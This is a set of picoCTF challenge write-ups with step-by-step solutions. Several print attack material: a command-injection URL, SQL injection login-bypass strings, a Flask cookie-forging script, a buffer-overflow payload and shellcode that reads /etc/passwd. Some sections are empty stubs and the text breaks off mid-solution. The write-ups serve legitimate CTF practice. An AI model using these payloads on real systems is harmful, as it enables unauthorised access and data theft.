# PicoCTF Write-UP (11 ~ 15 page)
## extensions
![](https://i.imgur.com/1OUNFr7.png)

### Hints
1. How do operating systems know what kind of file it is? (It's not just the ending!
2. Make sure to submit the flag as picoCTF{XXXXX}

### Solution by steps
1. Download the txt file
2. Because there's no 'picoCTF' in it, change the file type to png and you'll see this
![](https://i.imgur.com/TjP4uk9.png)

### Useful Stuffs
None


## What Lies Within
![](https://i.imgur.com/QYrmxmN.png)

### Hints
1. There is data encoded somewhere... there might be an online decoder.

### Solution by steps
1. Download the image and upload it to [Online Steganography Tool](https://stylesuxx.github.io/steganography/)
2. Hit the 'Decode' button and get the flag in the Hidden message subtitle

### Useful Stuffs
1. https://zomry1.github.io/what-lies-within/
2. https://stylesuxx.github.io/steganography/

## Let's get dynamic
![](https://i.imgur.com/JnEyMd6.png)

### Hints
1. Running this in a debugger would be helpful

### Solution by steps
1. `wget https://mercury.picoctf.net/static/dbb130222bcd47ce98d355561e8746c4/chall.S` and run `vi chall.S`  to change the file like this
```sequence=
...
.L2:
        movl    -276(%rbp), %eax
        movslq  %eax, %rbx
        leaq    -144(%rbp), %rax
        movq    %rax, %rdi
        movl    $49, %eax
        //call  strlen@PLT
        cmpq    %rax, %rbx
        jb      .L3
        leaq    -272(%rbp), %rcx
        leaq    -208(%rbp), %rax
        movl    $49, %edx
        movq    %rcx, %rsi
        movq    %rax, %rdi
        call    memcmp@PLT
        testl   %eax, %eax
        je      .L4
        leaq    .LC1(%rip), %rdi
        call    puts@PLT
        movl    $0, %eax
        jmp     .L6
...
```
2. Exit it and run `gcc -g chall.S`,`chmod +x ./a.out`,`gdb ./a.out`
3. After that, run `x/96i main` to find the address which contains `memcmp@plt` and quit
4. Run `start`,`break *0xTHE_NUMBER_YOU_GOT_ABOVE` and run `c` type in whatever you want
5. Last run `printf "%s\n", $rsi` to get your flag

### Useful Stuffs
1. https://code.yidas.com/linux-vi-vim-command/
2. https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Lets_get_dynamic.md
3. https://www.youtube.com/watch?v=sb8burpLyok&ab_channel=MartinCarlisle

## Most Cookies
![](https://i.imgur.com/GbaXcT4.png)

### Hints
1. How secure is a flask cookie?

### Solution by steps
1. Run `wget https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py` and `vim server.py`to look at the source code
2. Press the link, press the 'EditThisCookie' button and copy the cookie value
![](https://i.imgur.com/4YN0vzh.png)
![](https://i.imgur.com/5bAZulD.png)
*You can download EditThisCookie in [here](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=zh-TW)*

3. Go back to the webshell and run `vim solve.py`
```python=
import flask
import hashlib

from sys import argv
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature

cookie = argv[1]

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", 
"shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", 
"biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", 
"wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", 
"lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

real_secret = ''

for secret in cookie_names:
	try:
		serializer = URLSafeTimedSerializer(
   			secret_key=secret,	
   			salt='cookie-session',
   			serializer=TaggedJSONSerializer(),
   			signer=TimestampSigner,
   			signer_kwargs={
   				'key_derivation' : 'hmac',
   				'digest_method' : hashlib.sha1
   		}).loads(cookie)
	except BadSignature:
		continue

	print(f'Secret key: {secret}')
	real_secret = secret

session = {'very_auth' : 'admin'}

print(URLSafeTimedSerializer(
	secret_key=real_secret,
	salt='cookie-session',
	serializer=TaggedJSONSerializer(),
	signer=TimestampSigner,
	signer_kwargs={
		'key_derivation' : 'hmac',
		'digest_method' : hashlib.sha1
	}
).dumps(session))
```
3. After running `python solve.py THE_COOKIE_VALUE_YOU_GOT_FROM_THE_WEBSITE` and you'll get 
```c
Secret key: gingersnap
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YwHIBg.g2vUR89BNmKjOHqmUtUdL4uoYJo
```
4. Enter the Secret key you got to the website and press 'EditThisCookie' button to change the cookie value to THE_STRING_UNDER_SECRET_KEY
5. Reload the page and you'll get the flag

### Useful Stuffs
1. https://github.com/xnomas/PicoCTF-2021-Writeups/tree/main/Most_Cookies

## caas
![](https://i.imgur.com/DZTIuNH.png)

### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js` and run `strings index.js` to read the sourse code
2. Press the link and you'll see this
![](https://i.imgur.com/bk5Rtv4.png)
3. Change the URL to `https://caas.mars.picoctf.net/cowsay/hi`and get this
```python
 ____
< hi >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
4. Try `https://caas.mars.picoctf.net/cowsay/hi;ls`
```python=
 ____
< hi >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```
*Which means linux commands works here*
5. Go to `https://caas.mars.picoctf.net/cowsay/hi;cat%20falg.txt` and grab your flag

### Useful Stuffs
1. https://ankmak.com/tech/2022/02/10/picoctf-write-up-web-exploitation.html#caas-150-points

## XtraORdinary
![](https://i.imgur.com/RDedZZN.png)

### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/picoMini+by+redpwn/Cryptography/xtraordinary/output.txt` and `cat output.txt` to take the string: `57657535570c1e1c612b3468106a18492140662d2f5967442a2960684d28017931617b1f3637`
2. `wget https://artifacts.picoctf.net/picoMini+by+redpwn/Cryptography/xtraordinary/encrypt.py` and `vim encrypt.py` to realize how the xor encryption does
3. `vim solve.py` and write down 
```python=
#!/usr/bin/env python3

from random import randint
from Crypto.Util.number import bytes_to_long, long_to_bytes

ctxt = long_to_bytes(0x57657535570c1e1c612b3468106a18492140662d2f5967442a2960684d28017931617b1f3637);
key = b'Africa!';

def encrypt(ptxt, key):
    ctxt = b''
    for i in range(len(ptxt)):
        a = ptxt[i]
        b = key[i % len(key)]
        ctxt += bytes([a ^ b])
    return ctxt


random_strs = [
    b'my encryption method',
    b'is absolutely impenetrable',
    b'and you will never',
    b'ever',
    b'break it'
]

ctxt = encrypt(ctxt, random_strs[2]);
ctxt = encrypt(ctxt, random_strs[3]);
ctxt = encrypt(ctxt, random_strs[4]);

flag = encrypt(ctxt, key);
print(flag);
```
4. Run `python solve.py`  to get the flag

### Useful Stuffs
1. https://ankmak.com/tech/2021/10/07/picoctf-write-up-cryptography.html#xtraordinary-150-points
2. https://b1ue.x0.com/writeup/2021picomini/#XtraORdinary

## triple-secure
![](https://i.imgur.com/PxTH7YC.png)

### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/picoMini+by+redpwn/Cryptography/triple-secure/public-key.txt` and `wget https://artifacts.picoctf.net/picoMini+by+redpwn/Cryptography/triple-secure/encrypt.py`
2. `cat public-key.txt` and get 
```python
n1: 15192492059814175574941055248891268822162533520576381643453916855435310880285336743521199057138647926712835561752909538944229702432795423884081992987060760867003375755338557996965825324749221386675061886921763747311599846248565297387814717840084998677273427776535730840343260681623323972936404815862969684384733188827100528542007213405382537935243645704237369770300643318878176739181891072725262069278646319502747718264711249767568106460533935904219027313131270918072460753061248221785076571054217566164086518459844527639082962818865640864990672033657423448004651989761933295878220596871163544315057550871764431562609
n2: 15896482259608901559307142941940447232781986632502572991096358742354276347180855512281737388865155342941898447990281534875563129451327818848218781669275420292448483501384399236235069545630630803245125324540747189305877026874280373084005881976783826855683894679886076284892158862128016644725623200756074647449586448311069649515124968073653962156220351541159266665209363921681260367806445996085898841723209546021525012849575330252109081102034217511126192041193752164593519033112893785698509908066978411804133407757110693612926897693360335062446358344787945536573595254027237186626524339635916646549827668224103778645691
n3: 16866741024290909515057727275216398505732182398866918550484373905882517578053919415558082579015872872951000794941027637288054371559194213756955947899010737036612882434425333227722062177363502202508368233645194979635011153509966453453939567651558628538264913958577698775210185802686516291658717434986786180150155217870273053289491069438118831268852205061142773994943387097417127660301519478434586738321776681183207796708047183864564628638795241493797850819727510884955449295504241048877759144706319821139891894102191791380663609673212846473456961724455481378829090944739778647230176360232323776623751623188480059886131
e: 65537
c: 5527557130549486626868355638343164556636640645975070563878791684872084568660950949839392805902757480207470630636669246237037694811318758082850684387745430679902248681495009593699928689084754915870981630249821819243308794164014262751330197659053593094226287631278905866187610594268602850237495796773397013150811502709453828013939726304717253858072813654392558403246468440154864433527550991691477685788311857169847773031859714215539719699781912119479668386111728900692806809163838659848295346731226661208367992168348253106720454566346143578242135426677554444162371330348888185625323879290902076363791018691228620744490
```
3. `strings encrypt.py` and get
```python=
#!/usr/bin/env python3
from Crypto.Util.number import getPrime, bytes_to_long
with open('flag.txt', 'rb') as f:
    flag = f.read()
p = getPrime(1024)
q = getPrime(1024)
r = getPrime(1024)
n1 = p * q
n2 = p * r
n3 = q * r
moduli = [n1, n2, n3]
e = 65537
c = bytes_to_long(flag)
for n in moduli:
    c = pow(c, e, n)
with open('public-key.txt', 'w') as f:
    f.write(f'n1: {n1}\n')
    f.write(f'n2: {n2}\n')
    f.write(f'n3: {n3}\n')
    f.write(f'e: {e}\n')
    f.write(f'c: {c}\n')
```
*Run `pip install libnum` if you don't have it*
4. `vim solve.py` and write
```python=
import libnum
import gmpy2
n1 = 15192492059814175574941055248891268822162533520576381643453916855435310880285336743521199057138647926712835561752909538944229702432795423884081992987060760867003375755338557996965825324749221386675061886921763747311599846248565297387814717840084998677273427776535730840343260681623323972936404815862969684384733188827100528542007213405382537935243645704237369770300643318878176739181891072725262069278646319502747718264711249767568106460533935904219027313131270918072460753061248221785076571054217566164086518459844527639082962818865640864990672033657423448004651989761933295878220596871163544315057550871764431562609
n2 = 15896482259608901559307142941940447232781986632502572991096358742354276347180855512281737388865155342941898447990281534875563129451327818848218781669275420292448483501384399236235069545630630803245125324540747189305877026874280373084005881976783826855683894679886076284892158862128016644725623200756074647449586448311069649515124968073653962156220351541159266665209363921681260367806445996085898841723209546021525012849575330252109081102034217511126192041193752164593519033112893785698509908066978411804133407757110693612926897693360335062446358344787945536573595254027237186626524339635916646549827668224103778645691
n3 = 16866741024290909515057727275216398505732182398866918550484373905882517578053919415558082579015872872951000794941027637288054371559194213756955947899010737036612882434425333227722062177363502202508368233645194979635011153509966453453939567651558628538264913958577698775210185802686516291658717434986786180150155217870273053289491069438118831268852205061142773994943387097417127660301519478434586738321776681183207796708047183864564628638795241493797850819727510884955449295504241048877759144706319821139891894102191791380663609673212846473456961724455481378829090944739778647230176360232323776623751623188480059886131
e = 65537
c = 5527557130549486626868355638343164556636640645975070563878791684872084568660950949839392805902757480207470630636669246237037694811318758082850684387745430679902248681495009593699928689084754915870981630249821819243308794164014262751330197659053593094226287631278905866187610594268602850237495796773397013150811502709453828013939726304717253858072813654392558403246468440154864433527550991691477685788311857169847773031859714215539719699781912119479668386111728900692806809163838659848295346731226661208367992168348253106720454566346143578242135426677554444162371330348888185625323879290902076363791018691228620744490

mix = int(gmpy2.iroot(n1 * n2 * n3, 2)[0])

r = mix // n1
q = mix // n2
p = mix // n3

phi1 = (p - 1) * (q - 1)
phi2 = (p - 1) * (r - 1)
phi3 = (q - 1) * (r - 1)

d1 = libnum.modular.invmod(e, phi1)
d2 = libnum.modular.invmod(e, phi2)
d3 = libnum.modular.invmod(e, phi3)

c = pow(c, d3, n3)
c = pow(c, d2, n2)
c = pow(c, d1, n1)
m = c

flag = libnum.n2s(m)
print(flag)
```
5. `python solve.py` and get your string

### Useful Stuffs
1. https://ankmak.com/tech/2021/10/07/picoctf-write-up-cryptography.html#triple-secure-150-points

## clutter-overflow
![](https://i.imgur.com/jyRTpqo.png)

### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall.c` and `strings chall.c` to know how it works
2. `wget https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall` 
3. `chmod +x ./chall`,`gdb ./chall`,`disassemble main` and get 
```python=
...
   0x000000000040073d <+118>:   lea    -0x110(%rbp),%rax
   0x0000000000400744 <+125>:   mov    %rax,%rdi
   0x0000000000400747 <+128>:   mov    $0x0,%eax
   0x000000000040074c <+133>:   call   0x4005d0 <gets@plt>
   0x0000000000400751 <+138>:   mov    $0xdeadbeef,%eax
   0x0000000000400756 <+143>:   cmp    %rax,-0x8(%rbp)
   0x000000000040075a <+147>:   jne    0x40078c <main+197>
   0x000000000040075c <+149>:   mov    $0xdeadbeef,%esi
...
```
4. Try `run` and input lots of 'a's but it returns 
```
code != 0xdeadbeef :(
[Inferior 1 (process 293) exited normally]
```
5. `exit` and try `(python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | ./chall ` and it returns 
```python=
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
cat: flag.txt: No such file or directory
```
6. Try `(python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890` and it returns the flag this time

### Useful Stuffs
1. https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/clutter-overflow/

## not crypto (SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/GPjbTk9.png)

### Hints
None

### Solution by steps
1. ` wget https://artifacts.picoctf.net/picoMini+by+redpwn/Reverse+Engineering/not-crypto/not-crypto`



## Easy as GDB(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/Bkr8Bb7.png)

### Hints
1. https://sourceware.org/gdb/onlinedocs/gdb/Basic-Python.html#Basic-Python
2. With GDB Python, I can guess wrong flags faster than ever before!

### Solution by steps



## Some Assembly Required 3
![](https://i.imgur.com/fPMPXYR.png)

### Hints
None

### Solution by steps
1. Press the link then right-click on the webpage to select 'Inspect'
2. Press 'Sourses' and select the file under 'wasm' then copy the two string in quotation marks at the end of the file
![](https://i.imgur.com/8t9BrJ6.png)
3. Go back to the webshell and run `vim solve.py`
```python=
d_1024 = b"PASTE_THE_STRING_BESIDE_`data (i32.const 1024)`_ADD_'x'_BEHIND_'\'"
d_1067 = b"PASTE_THE_STRING_BESIDE_`data (i32.const 1067)`_ADD_'x'_BEHIND_'\'"

out = bytearray()
for i, c in enumerate(d_1024):
    char = d_1067[4 - (i%5)]
    out.append(c ^ char)
print(out)
```
4. Run `python solve.py` to get your flag

### Useful Stuffs
1. https://www.youtube.com/watch?v=A8F9wfZB_78&ab_channel=HideWest

## filtered-shellcode
![](https://i.imgur.com/rQEgbbE.png)

### Hints
1. Take a look at the calling convention and see how you might be able to setup all the registers

### Solution by steps
1. `wget https://mercury.picoctf.net/static/bbf1df1382e5c08be25164bda6357775/fun`
2. `chmod +x ./fun`, `./fun` and it asked for a code but it returns `Segmentation fault (core dumped)` after enter a string
3. Run `gdb ./fun`,`disass main` to find this
```python=
...
   0x0804869c <+201>:   lea    -0x3f5(%ebp),%eax
   0x080486a2 <+207>:   push   %eax
   0x080486a3 <+208>:   call   0x80484f6 <execute>
   0x080486a8 <+213>:   add    $0x10,%esp
   0x080486ab <+216>:   mov    $0x0,%eax
...
```
4. Use `b *0x80484f6` to set a break point and run `disass execute` to find this
```python=
...
   0x080485c3 <+205>:   mov    %eax,-0x20(%ebp)
   0x080485c6 <+208>:   mov    -0x20(%ebp),%eax
   0x080485c9 <+211>:   call   *%eax
   0x080485cb <+213>:   mov    %ebx,%esp
...
```
5. Use `b *0x080485c9` to set the second break point, press `r`
6. Continue checking things in memory by running `x/25b $eax` and `x/25b $esp`
7. Quit GDB mode and run `pwn asm -f hex "mov eax, 17"`it returns `b811000000`
8. `pwn disasm "b81190900000909000"`and get
```python=
   0:    b8 11 90 90 00           mov    eax,  0x909011
   5:    00                       .byte 0x0
   6:    90                       nop
   7:    90                       nop
```
9. `pwn disasm "31C9F7E1B00551687373776468632F7061682F2F657489E3CD809391B00331D266BAFF0F42CD809231C0B004B301CD8093CD80"` and get
```python=
   0:    31 c9                    xor    ecx,  ecx
   2:    f7 e1                    mul    ecx
   4:    b0 05                    mov    al,  0x5
   6:    51                       push   ecx
   7:    68 73 73 77 64           push   0x64777373
   c:    68 63 2f 70 61           push   0x61702f63
  11:    68 2f 2f 65 74           push   0x74652f2f
  16:    89 e3                    mov    ebx,  esp
  18:    cd 80                    int    0x80
  1a:    93                       xchg   ebx,  eax
  1b:    91                       xchg   ecx,  eax
  1c:    b0 03                    mov    al,  0x3
  1e:    31 d2                    xor    edx,  edx
  20:    66 ba ff 0f              mov    dx,  0xfff
  24:    42                       inc    edx
  25:    cd 80                    int    0x80
  27:    92                       xchg   edx,  eax
  28:    31 c0                    xor    eax,  eax
  2a:    b0 04                    mov    al,  0x4
  2c:    b3 01                    mov    bl,  0x1
  2e:    cd 80                    int    0x80
  30:    93                       xchg   ebx,  eax
  31:    cd 80                    int    0x80
```
10. `pwn asm -f hex "push   0x7478742e; push   0x67616c66;" | xxd -p -r | pwn disasm` and it outputs
```python=
   0:    68 2e 74 78 74           push   0x7478742e
   5:    68 66 6c 61 67           push   0x67616c66
```
11. ` pwn disasm "31C031DBB011B303F7E3F7E3B302F7E3D1EB01D8B302F7E3F7E3D1EB01D8B302F7E3D1EB01D8B311F7E3B302F7E3F7E3D1EB01D8509031C0B07FB317F7E3B302F7E3D1EB01D8B302F7E35B90F7E35090"` and `pwn disasm "509031C031D2B240B040F7E250905A9031C0B00129C25890"` to rewrite the file
12. `printf "\x31\xC9\xF7\xE1\x51\x90\x31\xC0\x31\xDB\xB0\x11\xB3\x03\xF7\xE3\xF7\xE3\xB3\x02\xF7\xE3\xD1\xEB\x01\xD8\xB3\x02\xF7\xE3\xF7\xE3\xD1\xEB\x01\xD8\xB3\x02\xF7\xE3\xD1\xEB\x01\xD8\xB3\x11\xF7\xE3\xB3\x02\xF7\xE3\xF7\xE3\xD1\xEB\x01\xD8\x50\x90\x31\xC0\xB0\x7F\xB3\x17\xF7\xE3\xB3\x02\xF7\xE3\xD1\xEB\x01\xD8\xB3\x02\xF7\xE3\x5B\x90\xF7\xE3\x50\x90\x31\xC0\x31\xDB\xB0\x2F\xF7\xE0\xB3\x02\xF7\xE3\xF7\xE3\xD1\xEB\x01\xD8\x50\x90\x31\xC0\xB0\x2B\xB3\x03\xF7\xE3\xB3\x02\xF7\xE3\xF7\xE3\xF7\xE3\xD1\xEB\x01\xD8\xB3\x13\xF7\xE3\xB3\x05\xF7\xE3\xB3\x02\xF7\xE3\x5B\x90\xF7\xE3\x50\x90\x31\xC0\xB0\x05\x89\xE3\xCD\x80\x93\x90\x91\x90\xB0\x03\x31\xD2\x50\x90\x31\xC0\x31\xD2\xB2\x40\xB0\x40\xF7\xE2\x50\x90\x5A\x90\x31\xC0\xB0\x01\x29\xC2\x58\x90\x42\x90\xCD\x80\x92\x90\x31\xC0\xB0\x04\xB3\x01\xCD\x80\x93\x90\xCD\x80\n" | nc mercury.picoctf.net 16460` and get your key

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/filtered-shellcode.md

## Web Gauntlet 2
![](https://i.imgur.com/GybFDhi.png)

### Hints
1. I tried to make it a little bit less contrived since the mini competition.
2. Each filter is separated by a space. Spaces are not filtered.
3. There is only 1 round this time, when you beat it the flag will be in filter.php.
4. There is a length component now.
5. sqlite

### Solution by steps
1. Press the link
2. Type `ad'||'min` in the Username and input `1' is not '0` for the password and press enter
![](https://i.imgur.com/JAbHHVB.png)
3. Enter `http://mercury.picoctf.net:57359/filter.php` to see the flag

### Useful Stuffs
1. https://www.youtube.com/watch?v=YXAHhpJtlIc&t=3s&ab_channel=RahulSingh

## ARMssembly 4
![](https://i.imgur.com/fybTJLc.png)

### Hints
1. Switching things up

### Solution by steps
1. After downloading the file and read it
2. You'll find out that the flag is `THE_NUMBER_THE_QUESTION_GAVE + 115`and turn from decimal to hexcimal

### Useful Stuffs
1. https://github.com/wlmci23/pico21/tree/main/Reverse%20Engineering/ARMssembly%204

## Powershelly
![](https://i.imgur.com/wgv6zNI.png)

### Hints
1. We tend to move only forward, but it may be a good idea to begin solving it backwards.
2. The flag is in standard format, I promise.

### Solution by steps
1. `wget https://mercury.picoctf.net/static/b7d195fdb3c93fd2b3d363bb355555cb/output.txt` and `wget https://mercury.picoctf.net/static/b7d195fdb3c93fd2b3d363bb355555cb/rev_PS.ps1`
2. `vim solve.py` and run `python solve.py`
```python=
for i in range(len(output_dat)):
    ans = output_dat[i] ^ result ^ random[i]
    result = ans ^ result ^ random[i]
    fun.append(bin(ans)[2:])

# print(fun)

blocks = [""] * 5

for i in range(len(fun)):
    tmp = fun[i]
    raw = []
    block = []

    for j in range(0, len(tmp), 2):
        if tmp[j:j+2] == "11":
            raw.append("1")
        else:
            raw.append("0")
    look = [False] * len(raw)

    for j in range(len(raw)):
        y = (j * seed[i]) % len(raw)

        while look[y] == True:
            y = (y+1) % len(raw)

        look[y] = True
        block.append(raw[y])

    for j in range(30):
        blocks[j // 6] += block[j]
    for j in range(5):
        blocks[j] += " "

for i in range(0, len(blocks[0]), 7):
    if blocks[0][i:i+7] == "100001 ":
        print(0, end = "")
    else:
        print(1, end = "")

print()
```
*Don't forget to Press esc to exit*
3. Copy the result you just get and paste after running  `cat > input.txt`
4. `vim s.py` and run `python s.py` to get your flag
```python=
from Crypto.Util.number import long_to_bytes
print(long_to_bytes(0bTHE_RESULT_YOU_GOT).decode())
```

### Useful Stuffs
1. https://hackmd.io/@bigdrea6/BJcLLkoW5
2. https://ret2home.github.io/blog/CTF/picoctf-2021/rev/powershelly/
3. https://www.youtube.com/watch?v=MxywIqXvPrQ&ab_channel=MissingSemester
4. https://github.com/IRS-Cybersec/ctfdump/tree/master/picoCTF/2021/RE/Powershelly

## la cifra de
![](https://i.imgur.com/fXi5usz.png)

### Hints
1. There are tools that make this easy.
2. Perhaps looking at history will help

### Solution by steps
1. ` nc jupiter.challenges.picoctf.org 58295`
2. Copy the woeds and use [vigenere-solver](https://www.guballa.de/vigenere-solver) to decrypt
3. Find the flag in the result

### Useful Stuffs
1. https://www.guballa.de/vigenere-solver
2. https://ithelp.ithome.com.tw/articles/10279461?sc=hot

## picobrowser
![](https://i.imgur.com/KdaYsH2.png)

### Hints
1. You don't need to download a new web browser

### Solution by steps
1. Press the link 
![](https://i.imgur.com/DLPRCaz.png)
2. Press 'Flag' button but get this...
![](https://i.imgur.com/2T2BX9Y.png)
3. Press 'F12' to enter the DevTool window
4. Press the three dots beside the gear button >>> 'More tools' >>> 'Network conditions' and change the user agent to 'picobroswer'
![](https://i.imgur.com/dLB1cEI.png)
5. Press the 'Flag' button to get the flag

### Useful Stuffs
1. https://ithelp.ithome.com.tw/articles/10247757

## asm1
![](https://i.imgur.com/893VvN5.png)

### Hints
1. assembly [conditions](https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm)

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/f1c2358ff7d1e9386e41552c549cf2f6/test.S`
2. `string test.S` and get 
```abc
asm1:
        <+0>:   push   ebp
        <+1>:   mov    ebp,esp
        <+3>:   cmp    DWORD PTR [ebp+0x8],0x3fb
        <+10>:  jg     0x512 <asm1+37>
        <+12>:  cmp    DWORD PTR [ebp+0x8],0x280
        <+19>:  jne    0x50a <asm1+29>
        <+21>:  mov    eax,DWORD PTR [ebp+0x8]
        <+24>:  add    eax,0xa
        <+27>:  jmp    0x529 <asm1+60>
        <+29>:  mov    eax,DWORD PTR [ebp+0x8]
        <+32>:  sub    eax,0xa
        <+35>:  jmp    0x529 <asm1+60>
        <+37>:  cmp    DWORD PTR [ebp+0x8],0x559
        <+44>:  jne    0x523 <asm1+54>
        <+46>:  mov    eax,DWORD PTR [ebp+0x8]
        <+49>:  sub    eax,0xa
        <+52>:  jmp    0x529 <asm1+60>
        <+54>:  mov    eax,DWORD PTR [ebp+0x8]
        <+57>:  add    eax,0xa
        <+60>:  pop    ebp
        <+61>:  ret  
```
3. Because `2e0 < 3fb`, go to <+12> and know that `2e0 != 280`
4. Therefore, go to <+19> and ensure that we should jump to <+29>
5. After moving value to eax,<+32> told us to do `2e0 - a` and get `2d6`
6. Then jump to <+60> which moves the value we get above to ebp and return to us
7. So `2d6` is the flag

### Useful Stuffs
1. https://ithelp.ithome.com.tw/articles/10251960

## Tapping
![](https://i.imgur.com/pZcQOyA.png)

### Hints
1. What kind of encoding uses dashes and dots?
2. The flag is in the format PICOCTF{}

### Solution by steps
1. `nc jupiter.challenges.picoctf.org 9422` and get `.--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ..--- -.... ---.. ...-- ---.. ..--- ....- -.... .---- ----- } `
2. Copy it and paste it to [Online Morse Decoder](https://morsedecoder.com/) to get the flag

### Useful Stuffs
1. https://morsedecoder.com/

## Flags
![](https://i.imgur.com/7QiqAFM.png)

### Hints
1. The flag is in the format PICOCTF{}

### Solution by steps
1. Download the picture and open it
![](https://i.imgur.com/JOn5kaq.png)
2. Use [International_maritime_signal_flags](https://en.wikipedia.org/wiki/International_maritime_signal_flags) and [International_Code_of_Signals](https://en.wikipedia.org/wiki/International_Code_of_Signals) to identify the flag

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Flags.md
2. https://en.wikipedia.org/wiki/International_maritime_signal_flags
3. https://en.wikipedia.org/wiki/International_Code_of_Signals

## Based
![](https://i.imgur.com/kDsKJx1.png)

### Hints
1. I hear python can convert things.
2. It might help to have multiple windows open.

### Solution by steps
1. `nc jupiter.challenges.picoctf.org 15130` and got 
```python=
Let us see how data is stored
lamp
Please give the 01101100 01100001 01101101 01110000 as a word.
```
*Just enter the second line as input or use [Binary-to-Ascii Converter](https://www.rapidtables.com/convert/number/binary-to-ascii.html)*
2. Then it gave us ...
```python=
Please give me the  154 151 147 150 164 as a word.
Input:
```
*Use [Octal to text Converter](http://www.unit-conversion.info/texttools/octal/)*
3. Then it gave us ...
```python=
Please give me the 636f6d7075746572 as a word.
Input:
```
*Use [Hex-to-Ascii Converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html)*
4. Here comes the flag

### Useful Stuffs
1. https://zomry1.github.io/based/
2. https://www.rapidtables.com/convert/number/binary-to-ascii.html
3. http://www.unit-conversion.info/texttools/octal/
4. https://www.rapidtables.com/convert/number/hex-to-ascii.html

## Mr-Worldwide
![](https://i.imgur.com/DIIbgxg.png)

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/d5570d48262dbba2a31f2a940409ad9d/message.txt`
2. `cat message.txt` and get `picoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}`
3. Find them through Google and get all the first alphabet from the result
```python=
[K]yoto             (35.028309, 135.753082)
[O]dessa            (46.469391, 30.740883)
[D]ayton            (39.758949, -84.191605)
[I]stanbul          (41.015137, 28.979530)
[A]bu Dhabi         (24.466667, 54.366669)
[K]uala Lumpur      (3.140853, 101.693207)
_
[A]ddis Ababa       (9.005401, 38.763611)
[L]oja              (-3.989038, -79.203560)
[A]msterdam         (52.377956, 4.897070)
[S]leepy Hollow     (41.085651, -73.858467)
[K]odiak            (57.790001, -152.407227)
[A]lexandria        (31.205753, 29.924526)
```

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Mr-Worldwide.md

## plumbing
![](https://i.imgur.com/SS3YxCs.png)

### Hints
1. Remember the flag format is picoCTF{XXXX}
2. What's a pipe? No not that kind of pipe... This [kind](http://www.linfo.org/pipes.html)

### Solution by steps
1. `nc jupiter.challenges.picoctf.org 14291 |grep pico` and you'll get the flag

### Useful Stuffs
None

## vault-door-3
![](https://i.imgur.com/KiwlAwA.png)

### Hints
1. Make a table that contains each value of the loop variables and the corresponding buffer index that it writes to.

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/943ea40e3f54fca6d2145fa7aadc5e09/VaultDoor3.java` and run `strings VaultDoor3.java`
```java=
import java.util.*;
class VaultDoor3 {
    public static void main(String args[]) {
        VaultDoor3 vaultDoor = new VaultDoor3();
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter vault password: ");
        String userInput = scanner.next();
        String input = userInput.substring("picoCTF{".length(),userInput.length()-1);
        if (vaultDoor.checkPassword(input)) {
            System.out.println("Access granted.");
        } else {
            System.out.println("Access denied!");
        }
    }
    // Our security monitoring team has noticed some intrusions on some of the
    // less secure doors. Dr. Evil has asked me specifically to build a stronger
    // vault door to protect his Doomsday plans. I just *know* this door will
    // keep all of those nosy agents out of our business. Mwa ha!
    //
    // -Minion #2671
    public boolean checkPassword(String password) {
        if (password.length() != 32) {
            return false;
        }
        char[] buffer = new char[32];
        int i;
        for (i=0; i<8; i++) {
            buffer[i] = password.charAt(i);
        }
        for (; i<16; i++) {
            buffer[i] = password.charAt(23-i);
        }
        for (; i<32; i+=2) {
            buffer[i] = password.charAt(46-i);
        }
        for (i=31; i>=17; i-=2) {
            buffer[i] = password.charAt(i);
        }
        String s = new String(buffer);
        return s.equals("jU5t_a_sna_3lpm18g947_u_4_m9r54f");
    }
```
2. Run `node` and do it like this
```python=
> password = "jU5t_a_sna_3lpm18g947_u_4_m9r54f"
'jU5t_a_sna_3lpm18g947_u_4_m9r54f'
> var i;
undefined
> var buffer = Array(32);
undefined
